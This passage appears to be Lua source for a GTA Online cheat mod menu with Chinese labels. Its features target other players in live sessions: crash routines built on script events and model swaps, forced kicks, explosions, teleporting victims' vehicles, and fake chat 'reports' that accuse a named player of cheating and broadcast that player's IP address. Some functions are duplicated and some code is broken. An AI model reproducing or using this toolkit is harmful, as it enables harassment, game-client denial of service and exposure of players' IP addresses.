menu.add_feature("重置载具最高速度(先观看玩家)", "action", vehiclecar.id, function(feat)
if feat.on then
menu.notify("当你离该玩家较近或观看该玩家时生效", "", 3, RGBAToInt(151, 0, 255, 255))
local veh = player.get_player_vehicle(pid)
network.request_control_of_entity(veh)
vehicle.modify_vehicle_top_speed(veh, 100)
end
end)

menu.add_feature("车辆熄火", "action", vehiclecar.id, function(feat)
if feat.on then
menu.notify("当你离该玩家较近或观看该玩家时生效", "", 3, RGBAToInt(151, 0, 255, 255))
local veh = player.get_player_vehicle(pid)
network.request_control_of_entity(veh)
vehicle.set_vehicle_engine_health(veh, 0)
vehicle.set_vehicle_engine_on(veh, false, true, true)
end
end)

menu.add_feature("车辆点火", "action", vehiclecar.id, function(feat)
if feat.on then
menu.notify("当你离该玩家较近或观看该玩家时生效", "", 3, RGBAToInt(151, 0, 255, 255))
local veh = player.get_player_vehicle(pid)
network.request_control_of_entity(veh)
vehicle.set_vehicle_engine_health(veh, 999999999)
vehicle.set_vehicle_engine_on(veh, true, true, true)
end
end)

isFriend = menu.add_feature("友好选项", "parent", playerlist[pid].id, function(feat)
end)

RegainHealth = menu.add_feature("循环掉血包", "toggle", isFriend.id, function(feat)
	requestmodel(0x28781518)
	while feat.on do
		local pos = player.get_player_coords(pid)
		pos.z = pos.z + 0.90
		object.create_object(0x28781518, pos, true, true)
		system.yield(0)
		return HANDLER_CONTINUE
	end
	feat.on = false
end)

FakeReport = menu.add_feature("虚假报告", "parent", playerlist[pid].id, function(feat)
end)

FakeReport1 = menu.add_feature("正在尝试崩溃", "action", FakeReport.id, function(feat)		
	playername = player.get_player_name(pid)		
	playertxt1 = "检测到恶意玩家 " ..playername.. " 正在尝试崩溃2TAKE1VIP用户 ¦"
	playertxt2 = "Malicious cheat player detected " ..playername.. " trying to crash current user ¦"
	network.send_chat_message(playertxt1, false)
	network.send_chat_message(playertxt2, false)
end)

FakeReport3 = menu.add_feature("正在尝试踢出", "action", FakeReport.id, function(feat)		
	playername = player.get_player_name(pid)		
	playertxt1 = "检测到恶意玩家 " ..playername.. " 正在尝试踢出2TAKE1VIP用户 ¦"
	playertxt2 = "Malicious cheat player detected " ..playername.. " trying to kick current user ¦"
	network.send_chat_message(playertxt1, false)
	network.send_chat_message(playertxt2, false)
end)

FakeReport2 = menu.add_feature("阻止全局崩溃", "action", FakeReport.id, function(feat)		
	playername = player.get_player_name(pid)		
	playertxt1 = "已阻止恶意玩家 " ..playername.. " 的全局玩家崩溃事件 ¦"
	playertxt2 = "Blocked global crash event for malicious player: " ..playername.. " ¦"
	network.send_chat_message(playertxt1, false)
	network.send_chat_message(playertxt2, false)
end)

FakeReport4 = menu.add_feature("触发R星反作弊C2 - IP", "action", FakeReport.id, function(feat)		
	playername = player.get_player_name(pid)
	playerip = player.get_player_ip(pid)
	
	local formattedIP = string.format("%d.%d.%d.%d",
	tonumber(string.sub(playerip, 1, 3)),
	tonumber(string.sub(playerip, 4, 6)),
	tonumber(string.sub(playerip, 7, 9)),
	tonumber(string.sub(playerip, 10, 12))
)

	playertxt1 = "检测到恶意玩家 " ..playername.. " IP:" ..formattedIP.. " 触发了R星反作弊C2 ¦"
	playertxt2 = "Malicious player detected " ..playername.. " IP:" ..formattedIP.. " Trigger Rockstar anti-cheat C2 ¦"
	network.send_chat_message(playertxt1, false)
	network.send_chat_message(playertxt2, false)
end)

FakeReport5 = menu.add_feature("触发R星反作弊E7 - IP", "action", FakeReport.id, function(feat)		
	playername = player.get_player_name(pid)
	playerip = player.get_player_ip(pid)
	
	local formattedIP = string.format("%d.%d.%d.%d",
	tonumber(string.sub(playerip, 1, 3)),
	tonumber(string.sub(playerip, 4, 6)),
	tonumber(string.sub(playerip, 7, 9)),
	tonumber(string.sub(playerip, 10, 12))
)

	playertxt1 = "检测到恶意玩家 " ..playername.. " IP:" ..formattedIP.. " 触发了R星反作弊E7 ¦"
	playertxt2 = "Malicious player detected " ..playername.. " IP:" ..formattedIP.. " Trigger Rockstar anti-cheat E7 ¦"
	network.send_chat_message(playertxt1, false)
	network.send_chat_message(playertxt2, false)
end)

Removeplayer = menu.add_feature("糖果踢" , "action", playerlist[pid].id,function()
	RemoveplayerName = player.get_player_name(pid)
	player.set_player_as_modder(pid, 1)
	system.yield(100)
	network.force_remove_player(pid)
	system.yield(0)
	network.force_remove_player(pid)
	system.yield(50)
	network.network_session_kick_player(pid)
	menu.notify("Kick " ..RemoveplayerName.. " Done")
end)

biaoji = menu.add_feature("标记玩家" , "action", playerlist[pid].id,function()
	player.set_player_as_modder(pid, 1)
	menu.notify("Done")
end)

biaoji2 = menu.add_feature("取消标记" , "action", playerlist[pid].id,function()
	player.unset_player_as_modder(pid,-1)
	menu.notify("Done")
end)

host_kick= menu.add_feature("主机踢出", "action", playerlist[pid].id,function()
	network.network_session_kick_player(pid)
	menu.notify("Done")
end)

local rid_clip = menu.add_feature("复制玩家名字", "action",playerlist[pid].id, function()
    local rid = player.get_player_name(pid)
    utils.to_clipboard(rid)
end)

local rid_clip = menu.add_feature("复制玩家RID", "action",playerlist[pid].id, function()
    local rid = player.get_player_scid(pid)
    utils.to_clipboard(rid)
end)

	playlist[pid] = {
		feat = playerlist[pid],
		features = features
	}
end

local function get_control_of_entity(h, t)
	if not h then 
		return
	end
if not network.has_control_of_entity(h) then
	network.request_control_of_entity(h)
local time = c.time() + t
while entity.is_an_entity(h) and not network.has_control_of_entity(h) and time > c.time() do
		c.wait(5)
	end
	end
	return network.has_control_of_entity(h)
end

local function give_godmode(e, bool)
	get_control_of_entity(e, 300)
	entity.set_entity_god_mode(e, bool)
end

local function spawn_vehicle(hash, coords, dir, maxed, god)
request_model(hash, 1000)
if maxed then	
entity.set_entity_coords_no_offset(car, coords)
entity.set_entity_heading(car, dir)
if god then
give_godmode(car, true)
end
stop_using_hash(hash)
return car
else
local car = vehicle.create_vehicle(hash, coords, dir, true, false)
if god then
give_godmode(car, true)
end
stop_using_hash(hash)
return car
end
end

local function bianshen (J)
local hash
hash = J
streaming.request_model(hash)
while(not streaming.has_model_loaded(hash))
do
c.wait(0)
end
player.set_player_model(hash)
streaming.set_model_as_no_longer_needed(hash)
return HANDLER_POP
end

local function suicide()
	ped.set_ped_health(player.get_player_ped(c.me()), 0)
end

function addtxt()
	TXT = {}
	local file = assert(io.open(custum_chat,'a+'))
	for line in file:lines() do
	table.insert(TXT,line)
	end
	file:close()
end
	
local function request_model(h, t)
if not h then 
return 
end
if not streaming.has_model_loaded(h) then
c.sR(h)
local time = c.time() + t
while not streaming.has_model_loaded(h) and time > c.time() do
c.wait(5)
end
end
return streaming.has_model_loaded(h)
end
local tpp = entity.set_entity_coords_no_offset
local Veh = vehicle.create_vehicle
local stop_using_hash = streaming.set_model_as_no_longer_needed
	
local function Cped(type, hash, coords, dir)
request_model(hash, 300)
local ped = c.pC(type, hash, coords, dir, true, false)
stop_using_hash(hash)
return ped
end			

local function mc()
entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()),  v3(0,0,0))
bianshen(0x705E61F2)
c.wait(100)
suicide()
c.wait(100)
ped.resurrect_ped(player.get_player_ped(c.me()))
c.wait(300)
bianshen(0x9C9EFFD8)
c.wait(100)
suicide()
c.wait(200)
ped.resurrect_ped(player.get_player_ped(c.me()))
end

local function suicide()
ped.set_ped_health(R.ped(), 0)
end
local MyId = player.player_id
local getPed = player.get_player_ped
local function own_ped()
return getPed(MyId())
end
local getVeh = ped.get_vehicle_ped_is_using
local function MyVeh(ped)
	return getVeh(own_ped())
end

local function request_model(h, t)
if not h then 
return 
end
if not streaming.has_model_loaded(h) then
c.sR(h)
local time = c.time() + t
while not streaming.has_model_loaded(h) and time > c.time() do
c.wait(5)
end
end
return streaming.has_model_loaded(h)
end

local function Cped(type, hash, coords, dir)
	request_model(hash, 300)
	local ped = ped.create_ped(type, hash, coords, dir, true, false)
	c.sR(hash)
	return ped
end
	
local function stat_set_float(hash, prefix, value, save)
    save = save or true
    local hash0, hash1 = hash
    if prefix then
        hash0 = "MP0_" .. hash
        hash1 = "MP1_" .. hash
        hash1 = gameplay.get_hash_key(hash1)
    end
    hash0 = gameplay.get_hash_key(hash0)
    local value0, e = stats.stat_get_float(hash0, -1)
    if value0 ~= value then
        stats.stat_set_float(hash0, value, save)
    end
    if prefix then
        local value1, e = stats.stat_get_float(hash1, -1)
        if value1 ~= value then
            stats.stat_set_float(hash1, value, save)
        end
    end
end

local function stat_set_int(hash, prefix, value, save)
    save = save or true
    local hash0, hash1 = hash
    if prefix then
        hash0 = "MP0_" .. hash
        hash1 = "MP1_" .. hash
        hash1 = gameplay.get_hash_key(hash1)
    end
    hash0 = gameplay.get_hash_key(hash0)
    local value0, e = stats.stat_get_int(hash0, -1)
    if value0 ~= value then
        stats.stat_set_int(hash0, value, save)
    end
    if prefix then
        local value1, e = stats.stat_get_int(hash1, -1)
        if value1 ~= value then
            stats.stat_set_int(hash1, value, save)
        end
    end
end

local function stat_set_bool(hash, prefix, value, save)
    save = save or true
    local hash0, hash1 = hash
    if prefix then
        hash0 = "MP0_" .. hash
        hash1 = "MP1_" .. hash
        hash1 = gameplay.get_hash_key(hash1)
    end
    hash0 = gameplay.get_hash_key(hash0)
    local value0, e = stats.stat_get_bool(hash0, -1)
    if value0 ~= value then
        stats.stat_set_bool(hash0, value, save)
    end
    if prefix then
        local value1, e = stats.stat_get_bool(hash1, -1)
        if value1 ~= value then
            stats.stat_set_bool(hash1, value, save)
        end
    end
end

local MyId = player.player_id
local getPed = player.get_player_ped
local function MyPed()
    return getPed(MyId())
end
local getCoords = entity.get_entity_coords
local function MyPos(ped)
    return getCoords(ped or MyPed())
end

local getVeh = ped.get_vehicle_ped_is_using
local function MyVeh(ped)
    return getVeh(ped or MyPed())
end

function get_everything()
    get_all_pickups()
    get_allveh()
    get_allobj()
    get_allpeds()
    object.get_all_pickups()
  end

 function get_all_pickups()
   allpickups = object.get_all_pickups()
 end

 function get_allveh()
   allveh = vehicle.get_all_vehicles()
 end

 function get_allobj()
   allobj = object.get_all_objects()
 end

 function get_allpeds()
   allpeds = ped.get_all_peds()
 end

local getPed = player.get_player_ped
local function own_ped()
    return getPed(MyId())
end

 local function get_control_of_entity(h, t)
    if not h then 
      return
   end
   if not network.has_control_of_entity(h) then
      network.request_control_of_entity(h)
      local time = c.time() + t
      while entity.is_an_entity(h) and not network.has_control_of_entity(h) and time > c.time() do
      c.wait(5)
      end
    end
    return network.has_control_of_entity(h)
  end

local function spawn_vehicle(hash, coords, dir, maxed, god)
request_model(hash, 1000)
if maxed then	
entity.set_entity_coords_no_offset(car, coords)
entity.set_entity_heading(car, dir)
if god then
give_godmode(car, true)
end
stop_using_hash(hash)
	return car
else
local car = vehicle.create_vehicle(hash, coords, dir, true, false)
if god then
give_godmode(car, true)
end
stop_using_hash(hash)
return car
end
end

local function suicide()
    ped.set_ped_health(R.ped(), 0)
end

local function give_godmode(e, bool)
    get_control_of_entity(e, 300)
    entity.set_entity_god_mode(e, bool)
end

local function script_event_crash(pid, n)
    if N.SH() == pid then
        for i = 0, 14 do
            N.sEv(-2122716210, pid, {0, i})
        end
    end
    for i = 1, n do
        for I, k in pairs(T.crashE) do
            local e = {}

            for L = 1, 39 do
                e[L] = math.random(1000000, 2147483647)
            end
            N.sEv(k, pid, e)
        end
    end
end

local fendfeat = menu.add_feature("Loop", "toggle", 0, function(feat)
	if feat.on then
		local fend_list = {}
		local bool_fend = {}
		for fid=0, 249 do
			local friend = friendlist[fid]
			local f = friend.feat
			local name = network.get_friend_index_name(fid)
			local fend_rid = network.get_friend_scid(name)
			local is_fen = network.is_scid_friend(fend_rid)
			local bool_onl = network.is_friend_online(name)
			local fend_max = network.get_friend_count()
			if is_fen and fid < fend_max then
			if f.hidden then f.hidden = false end
			local state = {}
			if bool_onl then
				state[#state + 1] = "在线"
			end
			if copy_rid == fend_rid then
				state[#state + 1] = " 已复制"
			end	
			if #state > 0 then
				name = name .. " [" .. table.concat(state) .. "]"
			end
			if f.name ~= name then f.name = name end
			else
		    if not f.hidden then
			f.hidden = true
				end
			end
		end
		return HANDLER_CONTINUE
	end
	return HANDLER_POP
end)

fendfeat.hidden = true
fendfeat.on = true

local onlineplayfor = menu.add_feature("Loop", "toggle", 0, function(feat)
	if feat.on then
		local Online = network.is_session_started()
		if not Online then
			PlayerPed = 0
		end
		for pid=0,31 do
            if player.is_player_valid(pid) then
                pppped = player.get_player_ped(pid)
                if pppped ~= 0 then
                    local play = playlist[pid]
                    local f = play.feat
                    local scid = player.get_player_scid(pid)
                    if f.hidden then f.hidden = false end
                    local name = player.get_player_name(pid)
                    local isYou = player.player_id() == pid
                    local state = {}
                    if Online then
                        if not PlayerPed == 0 or nil then
                            PlayerPed =	player.get_player_ped(player.player_id())
                        end
                        if isYou then
                            state[#state + 1] = " 你 "
                        end
                        if player.is_player_modder(pid, -1) then
                            state[#state + 1] = " 标记 "
                        end
                        if player.is_player_friend(pid) then
                            state[#state + 1] = " 好友 "
                        end
                        if (player.is_player_god(pid) or player.is_player_vehicle_god(pid)) and interior.get_interior_from_entity(pppped) == 0 then
                            state[#state + 1] = " 无敌 "
                        end
                        if player.is_player_host(pid) and bool_host then
                            state[#state + 1] = " 主机 "
                            if SessionHost ~= pid then
                                SessionHost = pid
                                notify_above_map("目前的~b~主机~b~是 " .. (isYou and " 你 " or name) .. "  ")
                            end
                        end
                        if pid == script.get_host_of_this_script() and bool_host then
                            state[#state + 1] = " 脚本主机 "
                            if ScriptHost ~= pid then
                                ScriptHost = pid
                                notify_above_map("目前的~b~脚本主机~b~是 " .. (isYou and " 你 " or name) .. "  ")
                            end
                        end
                    end
                    if #state > 0 then
                        name = name .. " > " .. table.concat(state)
                    end
                    if f.name ~= name then f.name = name end
                end
            else
                playlist[pid].feat.hidden=true
            end
		end
		return HANDLER_CONTINUE
	end
end)
onlineplayfor.hidden = true
onlineplayfor.on = true

Myped = function()
  return player.get_player_ped(player.player_id())
end
Pedshoot = function()
  return ped.is_ped_shooting(Myped()) and not player.is_player_in_any_vehicle(player.player_id()) or
      ped.get_vehicle_ped_is_using == 0 or
      ped.get_vehicle_ped_is_using == nil
end
Pedweapon = function()
  return ped.get_current_ped_weapon(Myped())
end

local function get_collision_vector(m, Ped)
local me = player.get_player_coords(m)
local pos, rot = me, cam.get_gameplay_cam_rot()
rot:transformRotToDir()
local pos = rot * 1000 + pos
local n, Pos = worldprobe.raycast(me, pos, -1, Ped)
local d = me - Pos
return Pos, math.abs(d.x) + math.abs(d.y), pos
end

oneselfxuanx =menu.add_feature("自我选项","parent",a.seplayer.id,function(feat)
end)

kill_me = menu.add_feature("自杀","action",oneselfxuanx.id,function()
if lll then
notify_above_map("防护型崩溃已启动，该功能无法使用")
return
end
local my_ped = player.get_player_ped(player.player_id()) 
ped.set_ped_health(my_ped,0.00)
end)
  
_U_fast_respawn=menu.add_feature("在上一个死亡点复活","toggle",oneselfxuanx.id,function(a)
while a.on do
Settings["fast_respawn"] = true
system.yield(0)
local me=player.player_id()
local my_ped=player.get_player_ped(me)
if ped.get_ped_health(my_ped)==0 then
local lastpos=player.get_player_coords(me)
c=0
while true do
system.yield(0)
entity.set_entity_coords_no_offset(my_ped,lastpos)
if controls.is_control_pressed(0,32) or controls.is_control_pressed(0,34) or controls.is_control_pressed(0,33) or controls.is_control_pressed(0,35) or controls.is_control_pressed(0,21) or controls.is_control_pressed(0,114) or controls.is_control_pressed(0,142) or controls.is_control_pressed(0,143) then
break
end                   
end
end
end
Settings["fast_respawn"] = false
end)
_U_fast_respawn.on = Settings["fast_respawn"]

_U_health_cheat=menu.add_feature("雷达隐匿","toggle",oneselfxuanx.id,function(a)
while a.on do
Settings["health_cheat"] = true
system.yield(0)
if a.on then
local me = player.player_id()
local myid = player.get_player_ped(me)
ped.set_ped_max_health(myid,0)
ped.set_ped_health(myid,1000)
else
local me = player.player_id()
local myid = player.get_player_ped(me)
ped.set_ped_max_health(myid,328)
ped.set_ped_health(myid,328)
end
end
Settings["health_cheat"] = false
end)
_U_health_cheat.on = Settings["health_cheat"]


vehdete = menu.add_feature("MK2检测","toggle",oneselfxuanx.id,function(k)
while k.on do
Settings["MK2jiance"] = true
for pid = 0 ,32 do
pedp = player.get_player_ped(pid)
local pedveh = ped.get_vehicle_ped_is_using(pedp)
local entityhash = entity.get_entity_model_hash(pedveh)
if entityhash == 2069146067 then
local hash = gameplay.get_hash_key("weapon_airstrike_rocket")
local offset = v3()
offset.x = 0.0
offset.y = 0.0
offset.z = 0.0	
gameplay.shoot_single_bullet_between_coords(player.get_player_coords(pid), player.get_player_coords(pid) + offset, 10000.00, hash, 0, true, false, 10000.0)
end
end
c.wait(500)
end
k.on = false
Settings["MK2jiance"] = false
end)
vehdete.on = Settings["MK2jiance"]

autohp = menu.add_feature("自动回血", "toggle",oneselfxuanx.id,function(feat) 
	while feat.on do
		Settings["zidonghuixue"] = true
		if ped.get_ped_health(player.get_player_ped(player.player_id())) < 328.0 and ped.get_ped_health(player.get_player_ped(player.player_id())) > 1.0 then
			ped.set_ped_health(player.get_player_ped(player.player_id()), 328.0)
		end		
		return HANDLER_CONTINUE
	end
	feat.on = false
	Settings["zidonghuixue"] = false
end)

autohp.on = Settings["zidonghuixue"]

auto_clean = menu.add_feature("自动清洁", "toggle", oneselfxuanx.id, function(feat) 
	if feat.on then
		local my_ped = player.get_player_ped(player.player_id())
		ped.clear_ped_blood_damage(player.player_id())
		return HANDLER_CONTINUE
	end
end)
auto_clean.on = Settings["auto_clean"]

autorc = menu.add_feature("自动复活", "toggle",oneselfxuanx.id,function(feat) 
while feat.on do
Settings["zidongfuhuo"] = true
if ped.get_ped_health(player.get_player_ped(player.player_id())) < 1.0 then
pos = player.get_player_coords(player.player_id())
ped.resurrect_ped(player.get_player_ped(player.player_id()))
entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), pos)
end
system.wait(300)
end
feat.on = false
Settings["zidongfuhuo"] = false
end)

autorc.on = Settings["zidongfuhuo"]

trailcd0 = c.df("天基炮无冷却","toggle",oneselfxuanx.id,function(k)
	while k.on do
		Settings["tianjipaowulengque"] = true
		stat_set_int("ORBITAL_CANNON_COOLDOWN",0,0)
		c.wait(5)
	end
	k.on = false
	Settings["tianjipaowulengque"] = false
end)
trailcd0.on = Settings["tianjipaowulengque"]

AllspoofMenu = menu.add_feature("全局恶搞","parent",a.sessionoption.id,function(feat)
end)

AllVerhicleSoakInWater = menu.add_feature("将所有车辆扔入水中","action",AllspoofMenu.id,function(feat, pid)
	allvehs = vehicle.get_all_vehicles()
	local myPed = MyPed()
	local myPos = MyPos(myPed)
	local myVeh = MyVeh(myPed)
	for i = 1, #allvehs do
		if myVeh ~= allvehs[i] and myPos:magnitude(MyPos(allvehs[i])) <= 1000 then
			entity.get_entity_model_hash(allvehs[i])
			entity.set_entity_coords_no_offset(allvehs[i], v3(-3373,-854,-5))
		end
	end
end)

function get_random_pid()
    local pid=math.random(0,31)
    if player.is_player_valid(pid) and not player.is_player_friend(pid) and player.player_id() ~= pid then
        return pid
    else
        return false
    end
end

_U_fuck_session2=menu.add_feature("摇晃战局","toggle",AllspoofMenu.id,function(a)
	while a.on do
		system.yield(0)
		for pid=0,31 do
			if player.is_player_valid(pid) and not player.is_player_friend(pid)  and player.player_id() ~= pid then
				local killer=get_random_pid()
				if killer then
					fire.add_explosion(player.get_player_coords(pid)-v3(0,0,30),1,false,true,99999999,player.get_player_ped(killer))
				end
			end
		end
	end
end)

a.teleportcarp = c.df("传送到我","toggle",AllspoofMenu.id,function(k)
	while k.on do
		for pid = 0 , 32 do
			if pid ~= player.player_id() and player.is_player_valid(pid) then 
				pos = entity.get_entity_coords(player.get_player_ped(player.player_id()))
				if ped.is_ped_in_any_vehicle(player.get_player_ped(pid)) then
					car = ped.get_vehicle_ped_is_using(player.get_player_ped(pid))
					network.request_control_of_entity(car)
					entity.set_entity_coords_no_offset(car, pos)				
				end
			end
		end
		c.wait(50)
	end
	k.on = false
end)

a.teleportcartosea = c.df("传送玩家到海洋","toggle",AllspoofMenu.id,function(k)
	while k.on do
		for pid = 0 , 32 do
			if pid ~= player.player_id() and player.is_player_valid(pid) then 	
				if ped.is_ped_in_any_vehicle(player.get_player_ped(pid)) then
					car = ped.get_vehicle_ped_is_using(player.get_player_ped(pid))
					network.request_control_of_entity(car)
					entity.set_entity_coords_no_offset(car, v3(-3373,-854,-5))				
				end
			end
		end
		c.wait(50)
	end
	k.on = false
end)

a.teleportcartoair = c.df("传送玩家上天","toggle",AllspoofMenu.id,function(k)
while k.on do
for pid = 0 , 32 do
if pid ~= player.player_id() and player.is_player_valid(pid) then 	
if ped.is_ped_in_any_vehicle(player.get_player_ped(pid)) then
car = ped.get_vehicle_ped_is_using(player.get_player_ped(pid))
network.request_control_of_entity(car)
entity.set_entity_coords_no_offset(car, v3(2233.308,8255.207,2000))				
end
end
end
c.wait(50)
end
k.on = false
end)


a.airstrikesession = menu.add_feature("火箭雨","toggle",AllspoofMenu.id, function(feat,pid)
while feat.on do
for pid = 0 , 32 do
 if  pid ~= c.me() then 
local hash = gameplay.get_hash_key("weapon_airstrike_rocket")
local pos = v3()
pos = player.get_player_coords(pid)
pos.z = pos.z + 10.0
local offset = v3()
offset.x = math.random(-5,5)
offset.y = math.random(-5,5)
offset.z = math.random(-5,5)
gameplay.shoot_single_bullet_between_coords(pos, player.get_player_coords(pid) + offset, 10000.00, hash, 0, true, false, 10000.0)
c.wait(50)
end
end
end
feat.on = false
end)


a.upnsession= c.df("循环原子能枪","toggle",AllspoofMenu.id,function(k,pid)
while k.on do
for pid = 0 , 32 do
if pid ~= c.me() then
pedp = player.get_player_ped(pid)
pos = player.get_player_coords(pid)
fire.add_explosion(pos,70, true, false, 0, pedp)
end
end	
c.wait(10)
end
k.on = false
end)

a.taskclear= c.df("冻结","toggle",AllspoofMenu.id,function(k,pid)
	while k.on do 
		for pid = 0, 31 do
			if pid ~= c.me() then
				pedp = player.get_player_ped(pid)
				ped.clear_ped_tasks_immediately(pedp)
			end
		end
		c.wait(5)
	end
	k.on = false
end)

a.baozha= c.df("爆炸", "toggle",AllspoofMenu.id,function(feat, pid)
	if feat.on then
		for pid = 0, 32 do
			if pid ~= player.player_id() and player.is_player_valid(pid) then
				fire.add_explosion(player.get_player_coords(pid), 0, true, false, 0, player.get_player_ped(pid))
				system.wait(15)
			end
		end
		return HANDLER_CONTINUE
	else
		return HANDLER_POP
	end
end)

scekick = menu.add_feature("全局禁用被动", "action", AllspoofMenu.id, function(feat,pid)
	for pid = 0, 32 do	
	if pid ~= c.me() then
    N.sEv(-909357184,pid,{1, 1})
	end
	end
	c.wait(50)
end)

clonesession = c.df("全局克隆全局","action",AllspoofMenu.id,function(feat,pid)
	for pid = 0, 32 do
		local offset = v3(0.0,0.0,0.0)
		local rot = v3(0.0,90,0.0)
		if  pid ~= c.me() then 
			for i = 1, 2 do
				local pedp = player.get_player_ped(pid)
				local clone = ped.clone_ped(player.get_player_ped(pid))
				entity.attach_entity_to_entity(clone, pedp, 0, offset, rot, true, true, false, 0, true)
				c.wait(10)
			end
		end
	end	
end)

cargosessionplayer= c.df("货机末日-掉帧","action",AllspoofMenu.id,function(k,pid)
	for pid = 0, 31 do
		if pid ~= c.me() then		
			pos = player.get_player_coords(pid)
			local offset = v3(0,0,0)
			local rot = v3(0,0,0.0)
			local pedp = player.get_player_ped(pid)
			cargo = spawn_vehicle(368211810,pos,0)
			get_control_of_entity(cargo, 300)
			entity.set_entity_god_mode(cargo, true)
			entity.attach_entity_to_entity(cargo, pedp, 0, offset, rot, true, true, false, 0, true)
		end
	end			
end)

kosatkasessionplayer= c.df("潜艇末日-掉帧","action",AllspoofMenu.id,function(k,pid)
	for pid = 0, 31 do
		if pid ~= c.me() then				
			pos = player.get_player_coords(pid)
			local offset = v3(0,0,0)
			local rot = v3(0,0,0.0)
			local pedp = player.get_player_ped(pid)
			kosatka = spawn_vehicle(1336872304,pos,0)
			get_control_of_entity(kosatka, 300)
			entity.set_entity_god_mode(kosatka, true)
			entity.attach_entity_to_entity(kosatka, pedp, 0, offset, rot, true, true, false, 0, true)
		end
	end	
end)

world_force = menu.add_feature("发射所有车辆", "action", AllspoofMenu.id, function(feat)
    get_everything()
    system.wait(100)
    local vel, velo = v3(), v3()
    velo.x = 0.0
    velo.y = 0.0
    velo.z = 1000.00
    vel.x = math.random(1000.0, 10000.0)
    vel.y = math.random(1000.0, 10000.0)
    vel.z = math.random(1000.0, 7500.0)
    local myveh = player.get_player_vehicle(player.player_id())
    for i = 1, #allpeds do
        if not ped.is_ped_a_player(allpeds[i]) then
            entity.freeze_entity(allpeds[i], false)
            entity.apply_force_to_entity(allpeds[i], 5, 100.0, 100.0, 100.0, 100.0, 100.0, 100.0, true, true)
            entity.set_entity_velocity(allpeds[i], vel)
        end
    end
    for y = 1, #allveh do
        if y ~= myveh then
            entity.freeze_entity(allveh[y], false)
            entity.set_entity_gravity(allveh[y], false)
            entity.set_entity_velocity(allveh[y], velo)
            system.wait(25)
            entity.set_entity_velocity(allveh[y], vel)
        end
    end
    for x = 1, #allobj do
        entity.freeze_entity(allobj[x], false)
        entity.set_entity_velocity(allobj[x], vel)
    end
end)

menu.add_feature("囚禁所有人", "action", AllspoofMenu.id, function(f)
for pid = 0, 31 do
local pos = player.get_player_coords(pid)
local Hash = gameplay.get_hash_key("prop_gascage01")
streaming.request_model(Hash)
while (not streaming.has_model_loaded(Hash)) do
system.wait(0)
end
pos.z = pos.z - 1
local obj = object.create_object(Hash, pos, true, false)
end
end)

cageplayer = c.df("全局困住","action",AllspoofMenu.id,function(k,pid)
	for pid = 0, 31 do
		if pid ~= c.me() then
			local attachhashcont = gameplay.get_hash_key("prop_gold_cont_01")
			pos = player.get_player_coords(pid)
			pos.z = pos.z - 2
			toilet = object.create_object(attachhashcont,pos,true,false)
		end
	end	
end)

ramcar = c.df("撞击玩家","action",AllspoofMenu.id,function(feat,pid)
for pid = 0 ,32 do
if pid ~= c.me() then 
local offset = v3()
local rot = v3()
rot.x=math.random(-90,90)
rot.y=math.random(-90,90)
rot.z=math.random(-90,90)
local pos = player.get_player_coords(pid)
car = spawn_vehicle(1663218586,pos,0)
vehicle.set_vehicle_forward_speed(car,1000)
local pedp = player.get_player_ped(pid)
c.wait(500)
entity.attach_entity_to_entity(car, pedp, 0, offset, rot, true, true, false, 0, true)
end
end
end)

crash1 = menu.add_feature("全局崩溃","parent",a.sessionoption.id,function(feat)
end)

mine_crash = menu.add_feature("领域","action",crash1.id, function()
	local mypid = player.get_player_ped(player.player_id())
	if lll then
		notify_above_map("已启用")
		return
	end
	notify_above_map("开启中...")
	caca1 = taomocar1(1784254509,player.player_id(),mypid,2)
	caca2 = taomocar1(2091594960,player.player_id(),mypid,3)
	system.wait(1000)
	notify_above_map("开启成功")
	lll = true
end)

mine1_crash = menu.add_feature("新领域单","action",crash1.id, function()
	local pos = v3(460.586,5571.714, 781.179)
	notify_above_map("创建中...")
	NNNNC = Cped(25,0x9B22DBAF,pos,0)
	entity.freeze_entity(NNNNC, true)
	entity.set_entity_visible(NNNNC,false)
	entity.set_entity_god_mode(NNNNC, true)
	network.request_control_of_entity(NNNNC)
	local offset = v3(0,0,-10)
	local rot = v3(0.0,0,0.0)
	car = spawn_vehicle(1784254509,pos,599)
	entity.set_entity_visible(car,false)
	entity.set_entity_god_mode(car, true)
	network.request_control_of_entity(car)
	entity.attach_entity_to_entity(car, NNNNC, 0, offset, rot, true, false, false, 0, true)
	system.wait(1000)
	notify_above_map("创建完成")
end)


modelcrash = menu.add_feature("全局崩溃", "action",crash1.id, function(feat)
if lll then
notify_above_map("防护型崩溃已启动，该功能无法使用")
return
end
local hash1, hash2, hash3, hash4
hash1 = 1885233650
hash2 = 1015224100
hash3 = 2627665880
hash4 = 3367706194
streaming.request_model(hash1)
streaming.request_model(hash2)
streaming.request_model(hash3)
streaming.request_model(hash4)
while not streaming.has_model_loaded(hash4) do
system.wait(0)
end
player.set_player_model(hash1)
system.wait(500)
while not streaming.has_model_loaded(hash2) do
system.wait(0)
end
while not streaming.has_model_loaded(hash1) do
system.wait(0)
end
player.set_player_model(hash1)
system.wait(500)
while not streaming.has_model_loaded(hash2) do
system.wait(0)
end
player.set_player_model(hash2)
system.wait(500)
while not streaming.has_model_loaded(hash3) do
system.wait(0)
end
player.set_player_model(hash3)
system.wait(500)
while not streaming.has_model_loaded(hash2) do
system.wait(0)
end
while not streaming.has_model_loaded(hash4) do
system.wait(0)
end
player.set_player_model(hash1)
system.wait(500)
while not streaming.has_model_loaded(hash2) do
system.wait(0)
end
while not streaming.has_model_loaded(hash1) do
system.wait(0)
end
player.set_player_model(hash1)
system.wait(500)
while not streaming.has_model_loaded(hash2) do
system.wait(0)
end
player.set_player_model(hash2)
system.wait(500)
while not streaming.has_model_loaded(hash3) do
system.wait(0)
end
player.set_player_model(hash3)
system.wait(500)
while not streaming.has_model_loaded(hash2) do
system.wait(0)
end
while not streaming.has_model_loaded(hash4) do
system.wait(0)
end
player.set_player_model(hash1)
system.wait(500)
while not streaming.has_model_loaded(hash2) do
system.wait(0)
end
while not streaming.has_model_loaded(hash1) do
system.wait(0)
end
player.set_player_model(hash1)
system.wait(500)
while not streaming.has_model_loaded(hash2) do
system.wait(0)
end
player.set_player_model(hash2)
system.wait(500)
while not streaming.has_model_loaded(hash3) do
system.wait(0)
end
player.set_player_model(hash3)
system.wait(500)
while not streaming.has_model_loaded(hash2) do
system.wait(0)
end
while not streaming.has_model_loaded(hash4) do
system.wait(0)
end
player.set_player_model(hash1)
system.wait(500)
while not streaming.has_model_loaded(hash2) do
system.wait(0)
end
while not streaming.has_model_loaded(hash1) do
system.wait(0)
end
